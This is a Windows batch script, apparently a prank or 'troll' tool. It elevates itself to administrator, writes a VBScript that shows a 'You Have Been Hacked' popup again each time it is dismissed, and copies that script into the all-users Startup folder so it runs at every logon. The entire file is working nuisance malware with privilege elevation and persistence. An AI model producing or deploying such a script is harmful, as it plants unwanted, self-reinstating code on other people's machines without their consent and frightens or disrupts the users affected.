@echo off
openfiles >nul 2>&1
if %errorlevel% neq 0 (	
    powershell -Command "Start-Process '%~0' -Verb runAs"
    exit /b
)
echo Set objShell = CreateObject("WScript.Shell") > troll.vbs
echo Do >> troll.vbs
echo     intButton = objShell.Popup("You Have Been Hacked", 0, "Info", 64) >> troll.vbs
echo Loop While intButton = 1 >> troll.vbs
move "troll.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"

